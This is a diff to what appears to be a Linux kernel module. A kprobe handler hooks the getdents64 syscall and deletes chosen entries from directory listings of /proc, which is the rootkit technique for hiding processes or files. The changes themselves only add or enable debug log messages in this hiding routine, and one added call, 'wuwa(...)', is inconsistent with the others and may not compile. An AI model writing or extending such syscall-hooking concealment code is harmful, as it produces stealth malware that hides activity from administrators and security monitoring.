@@ -55,7 +55,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
     uint64_t v4;
     // int v5;
 	if ((uint32_t)(regs->regs[1]) == 61) { // getdents64
-		// wuwa_info("dents called");
+		wuwa_info("dents called");
 		int fd = *(int*)(regs->user_regs.regs[0]);
 		struct linux_dirent *dirent = *(struct linux_dirent **) (regs->user_regs.regs[0] + 8);
 
@@ -82,8 +82,10 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
 	    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
+		/*&& MINOR(d_inode->i_rdev) == 1*/) {
 		    proc = 1;
+			wuwa("dent64: called for proc");
+		}
 
 		while (offset < ret)
 	    {
@@ -95,11 +97,11 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 			    {
 				    ret -= dir->d_reclen;
 				    memmove(dir, (void *)dir + dir->d_reclen, ret);
-					wuwa_info("skipped");
+					wuwa_info("dent64: skipped");
 				    continue;
 			    }
 			    prev->d_reclen += dir->d_reclen;
-				wuwa_info("skipped again");
+				wuwa_info("dent64: skipped again");
 		    }
 		    else
 		    {
